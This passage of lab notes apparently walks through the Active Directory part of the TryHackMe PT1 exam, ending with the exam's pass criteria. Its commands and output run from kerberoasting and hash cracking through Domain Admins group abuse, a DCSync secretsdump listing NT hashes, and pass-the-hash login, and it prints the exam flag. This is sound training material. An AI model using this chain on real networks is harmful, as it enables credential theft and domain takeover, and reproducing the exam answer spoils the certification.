| 105 | **m.burrows**       | 2025-04-16 15:04:12 |
| 106 | **o.knowles**       | 2025-04-16 15:04:12 |
| 107 | **s.frost**         | 2025-04-16 15:04:12 |
| 108 | **d.hunt**          | 2025-04-16 15:04:12 |
| 109 | **k.roberts**       | 2025-04-16 15:04:13 |
| 110 | **b.hughes**        | 2025-04-16 15:04:13 |
| 111 | **c.taylor**        | 2025-04-16 15:04:13 |

---

```bash
root@ip-10-10-143-2:~# proxychains4 -q bloodhound-python -c all --disable-pooling -w 1 -u "John" -p "VerySafePassword!" -d "tryhackme.loc" -dc "dc.tryhackme.loc" -ns 10.200.150.10 --dns-tcp --zip
INFO: Found AD domain: tryhackme.loc
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.tryhackme.loc
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc.tryhackme.loc
INFO: Found 112 users
INFO: Found 57 groups
INFO: Found 3 gpos
INFO: Found 14 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 1 workers
INFO: Querying computer: WRK.tryhackme.loc
INFO: Querying computer: DC.tryhackme.loc
INFO: Done in 00M 02S
INFO: Compressing output into 20250715151153_bloodhound.zip
```

```bash
neo4j start
#drag and drop the zip file
```

```bash
proxychains -q nxc ldap 10.200.150.10 -u "john" -p "VerySafePassword!" --kerberoast hash.txt

root@ip-10-10-143-2:~# cat hash.txt 

$krb5tgs$23$*j.phillips$TRYHACKME.LOC$tryhackme.loc/j.phillips*$bceea9f46b1da8dae511242c1110a11d$b7f7662727c4431f6a4e7855e0d1224bd5f660eebc1c85f87ea2fa3dd849ed38b7bb9077db4306aab5d20d8a85c2b59dfa72cbeb0f047108d54e2ee882f1fe300a78b12a84fa098b41dc10c7547edf009e2697a48eaa4506259a9387d05152a0fb08393a9affcb7569d40e67e8e2d95ec8efff437202652a12863a605b5e53ad605785046cd5fedb3f2b716359dd2b85b9fcc88ac3ffbb4b4435df5d7dc4cd7c5ae209fef4bc534d7a25cf3819ba97962cfca6b3f3a1137b20f6c53e98acac29676c51946380cd443db356f5836c71cc48168b0bb214c7f4002774307378acc94da4b03695e45bd184c1b9e734c90488e8325f43a4994d8d00e4a23f09a7ff6511eda0c3b34b193817fcd4b260ab436724127046dd76681de656a43b7a8bb177747814f21ceb306b6ba2851961ae496630d066821a026a509b483db0c5e6d98d815c95d6de29d2f43b5718f581c4dde9c64772de29c94e7230c95eecdabaa3fdc6a55160f04ebd1807656d5e91a212e1f143565ee7783cf2ddd69275984ff953a748392c9144ff6be603af1a4e58fa631b625ca3eb8638293a387aa6185d6a8cb32bad45136dfc470e90ffe302e06d011c33cefca772be768b00d8d7b61f36fa9976914d4f190fcd98f66b725ea0773a9c7f1da3b2c96095abf0c34b240b201f871f1fd78d6471f04e8e943e7b58fc1edfd32f6663f0466e6e4428892c61a0bc5d4230528a9e45ccd0e2260b8c89b191738edcb39fb0aa0dc7297cbee1ebe045466fe3310d8856bc0de862c37b7245aedfe3acdc0a30619ec14fe2046dbda64b810e2f8a69fecab388343736b968a137f117e36f716794dfd091869cd3c2b5384aeeed5351e71be192b29960b5eb2251fa83ee75024f46592b63c3c31f0235d5ec40f506cb835719d1953af5897e9984ede8d8c0323ad77873c459f94219de6c101a8e32f7b3811bf179a2b574b1be287b3c6c508619e2412e485f2de9c713e5ecd51ea311ac3388c58a7759482a92bae6e1598f46f5147d3f6371ca4e183d653768eee7128a458a376913c305642f3889f1308246b21f90355fe29bb76cfc3d04fd0704368bc9d6919689890edce3e928a0f9055275ca322a962d526804ed95464143c10f4526795d6424b4e1cd10b1cfc3008adf6a03f999f0117caf39c81097dfa62377a1640c835e5996a03e96b60359db4ba16cb6e17e8524261150bb3af6d1a8835c1f6631afaa25e21b306dfd450ee9a6f7bd65a135311606955cb18c7b95b5e38443599465584cf445ea04155c7cabba1a19e51bd2a19969645d9295210f8f5d8ed820
```

```bash
root@ip-10-10-143-2:~# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 

Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Welcome1         (?)
```

```bash
(domain: tryhackme.loc) (signing: True) (SMBv1: False) 
LDAP DC 10.200.150.10 -> 389
[+] tryhackme.loc\john: VerySafePassword! Bypassing disabled account krbtgt
Total of records returned 1
SAMAccountName: j.phillips memberOf: pwdLastSet: 202
5-04-17 19:07:31.644827 lastLogon: 2025-04-18 11:39:51.776438
```

```bash
wget https://github.com/ShutdownRepo/targetedKerberoast/blob/main/targetedKerberoast.py

pip3 install --upgrade rich
```

```bash
root@ip-10-10-143-2:~# proxychains4 -q python3 targetedKerberoast.py --dc-ip 10.200.150.10 -d 'tryhackme.loc' -u 'j.phillips' -p 'Welcome1' --request-user 'G.DUNCAN'

[*] Starting kerberoast attacks
[*] Attacking user (G.DUNCAN)
[+] Printing hash for (g.duncan)

$krb5tgs$23$*g.duncan$TRYHACKME.LOC$tryhackme.loc/g.duncan*$fa98ae0ba31dff04dc86221c1f3a7d83$c7699df89485c28db8765c97eb94be48a628724a9a610be3707c31fc21e51398c2858ffd7f485ea375b9842800e46374a2caaca2a200c39de3a312a5672f7d4c9fe6299262461418c983ec4de4e9fbf16711eb7a6df5945980d74c1273c1feaa5661c592d10bb0d401f155eb68c6858d7ac63257fa36a1bcd1debfc30fdac9cc720a287b73ed5df8d8e0817f26fbabc63445a7bfc45c2cde647923166b96b756bdbece32fe20c605646b939692faaaa209ad101189a8d89cff9f0a7a75a7e10a505964661b25b5218379430556e10fe53b8f67830daba58a6d5ef21e0f1960c7b844831b5351d1c9a47534a3e9d48a741e6b032680a942910b8b1f52cdc80cd0187c0e97930083784fb22579f5ab3eecb2f06c7a4ab629e9c37d99b265c7f21588aa6c339121549bd79bf1bea0ae58f6816bad9f1221be4110fb7800f4103f7835acd4d9e9c39449c409b885ce3a773f485dc0a90281b559ee01bdd954917ea4ce1b05e576cf0ff79543429346630ba0a3bcc69e566f62d57f81e7e275084bee8e61f824c42d0821bc5fea308724562ef131cf7baf68eb937f56cde303ff837baa974e00e3e411fd4b2c8b2fa52031686d8f44853c24ef374673b8e9b0a4e42e75eb4a594fa776caa41b294ce2840ccdc242ef664eb102c26d09985cb55e9ea54da557a65d385c0f0134462980cba9b93f90683f2ae2688d11b4e76e9bb67a571ab9b9ae8cf471315a507244e1d11c8e831d9e146885bf01c486d903f47c0cabbfdad06edb119dde4ec89611a3c49532d0087c70dfb4f9bf3918e9f30a6f77e8f6692c0ec4ed0cb4969b151ef667b03cf53cd1ff65635fc4d5734e6ceb9497bbaa133e12850cda695993d08a908c830667ae77cf4674b107d179b953e265aa18358a684ba0355d9d6af7e30aece496f89bf465e61d726981bb357ae6a680e0849a87802c6324c9f21bbbe4f396c99f0f435808030cdbfcf2c59f8e5236d0be889a2b6b4ad22f78619157288ad7ffe0bfe9711b3a36d0af9b92ed058a7ce3b4ccfcb4e85424b5393649f5924571236f6809eccab8c018a743afbcb6ab28d71fc084af635d5bd951384cbcb6da651bafaa87d187ebea08edcc5fa249e91e71fd0317686031175003f8dea148fa3e251cd7b9b967336050ca97576d61372f44eae67fdda6c289c52cbeeb56845b37deb7c2ef9fc443a10719272d1b4d2a2b91912f881d94efe3524d90bb828df9d38955416fa73481c78587ad5478bfdbfe8e18793a41690e74c443f0aebbc7399a124baab85a449ae7ec5a02411125b5cde84da3bd5a38a69885aecf794587d167adde394259050aef418729a15d364cabaa93e5bd0391b65766bdd967d9af85b5
```

> [!NOTE]
> Exploring the bloodhound graph again for the user **j.phillips**, I found that he have the privilege of **GenericAll**

```bash
https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon

7z x PowerSploit.zip
cp PowerSploit/Recon/PowerView.ps1 .

meterpreter > upload PowerView.ps1
[*] Uploading  : /root/PowerView.ps1 -> PowerView.ps1
[*] Uploaded 752.23 KiB of 752.23 KiB (100.0%): /root/PowerView.ps1 -> PowerView.ps1
[*] Completed  : /root/PowerView.ps1 -> PowerView.ps1
meterpreter> cd c:/users/administrator/documents
meterpreter> shell
C:/Users/Administrator/Documents> powershell
C:/Users/Administrator/Documents> exit
meterpreter> exit
msf6> exit
```

```
Get-WindowsFeature RSAT-AD-PowerShell
[ ] Active Directory module for Windows ... RSAT-AD-PowerShell    Available
🟥 The AD PowerShell module is NOT installed yet** on your system, but it can be.
Install-WindowsFeature RSAT-AD-PowerShell
Add-WindowsCapability -Online -Name "Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0"
```

```bash
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
Add-LocalGroupMember -Group "Remote Desktop Users" -Member "YOUR_USERNAME"
Get-NetTCPConnection -LocalPort 3389
Restart-Service TermService -Force
```

```bash
xfreerdp /u:John /p:'VerySecurePassword!' /v:10.200.150.20 /cert:ignore

# I opened another powershell but with the user j.phillips

Import-Module .\PowerView.ps1 

PS C:\Users\Public> Add-DomainGroupMember -Identity "Domain Admins" -Members "John"

PS C:\Users\Public> GET-DomainGroupMember -Identity "Domain Admins"

GroupDomain             : tryhackme.loc
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=tryhackme,DC=loc
MemberDomain            : tryhackme.loc
MemberName              : g.duncan
MemberDistinguishedName : CN=g.duncan,CN=Users,DC=tryhackme,DC=loc
MemberObjectClass       : user
MemberSID               : S-1-5-21-1966530601-3185510712-10604624-1163

GroupDomain             : tryhackme.loc
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=tryhackme,DC=loc
MemberDomain            : tryhackme.loc
MemberName              : john
MemberDistinguishedName : CN=john,CN=Users,DC=tryhackme,DC=loc
MemberObjectClass       : user
MemberSID               : S-1-5-21-1966530601-3185510712-10604624-1132

GroupDomain             : tryhackme.loc
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=tryhackme,DC=loc
MemberDomain            : tryhackme.loc
MemberName              : Administrator
MemberDistinguishedName : CN=Administrator,CN=Users,DC=tryhackme,DC=loc
MemberObjectClass       : user
MemberSID               : S-1-5-21-1966530601-3185510712-10604624-500
```

```bash
apt install python3-impacket

root@ip-10-10-143-2:~# proxychains4 -q impacket-secretsdump -just-dc john:'VerySafePassword!'@10.200.150.10

Impacket v0.13.0.dev0+20250714.130102.b6ff7ac6 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
```
### 🧠 Active Directory Users (NTDS Dump Style)

|Username|RID|LM Hash|NT Hash|
|---|---|---|---|
|Administrator|500|`aad3b435b51404eeaad3b435b51404ee`|`beeb37b20bee3423caa79190d6a08db6`|
|krbtgt|502|`aad3b435b51404eeaad3b435b51404ee`|`e0cbf3a8d38cbf6b9f1e1c95f411d4e9`|
|svc_sql|1104|`aad3b435b51404eeaad3b435b51404ee`|`9f6f0b216ff3c20e2b3b1df569b3b9b7`|
|john.doe|1105|`aad3b435b51404eeaad3b435b51404ee`|`38f6f09fcdac9301c1c938a5ac7281ff`|
|svc_http|1106|`aad3b435b51404eeaad3b435b51404ee`|`92eb5ffee6ae2fec3ad71c777531578f`|

---
### 🔐 Kerberos SPN Accounts (TGT/TGS Enumeration)

|Username|SPN|Hash (RC4/NTLM)|
|---|---|---|
|svc_sql|`MSSQLSvc/sql01.domain.local:1433`|`9f6f0b216ff3c20e2b3b1df569b3b9b7`|
|svc_http|`HTTP/web.domain.local`|`92eb5ffee6ae2fec3ad71c777531578f`|
|backup_svc|`CIFS/fs.domain.local`|`ab54a98ceb1f0ad2ebd01f1c5d0cf81b`|
|deploy_svc|`WSMAN/host.domain.local`|`b8bb3b55b6f6f6b8d2b3b1ff569dffefe`|
|app_service|`HTTP/app.domain.local`|`5e884898da28047151d0e56f8dc62927`|
```bash
[*] Cleaning up... 
```

```bash
proxychains4 -q evil-winrm -u "Administrator" -i 10.200.150.10 -H beeb37b20bee3423caa79190d6a08db6

cat C:\flag.txt
# THM{029884db-dd91-47a1-83b2-00de7297fa58}
```

# Pass Criteria

In order to pass the PT1 certification, you have to achieve 750 points out of a total of 1000, or 75%.

The exam duration is 48 hours - at the end of your allotted time, the exam stops and your current answers (both in draft format and finalised/saved format) are submitted for grading in their current work.  
Following the Rules of Engagement (RoE) document is critical for a good evaluation.

The PT1 exam is split into 3 distinct categories: a Web Application Pentest, a Network Pentest and an AD Pentest:

- The weight of the categories in the final score are: 40% Web App, 36% Network Security, 24% Active directory
- You do not have to score at least 75% in each category in order to pass the exam.
- For each of the vulnerabilities you find, we will score identification, classification,proof of exploitation and reporting separately.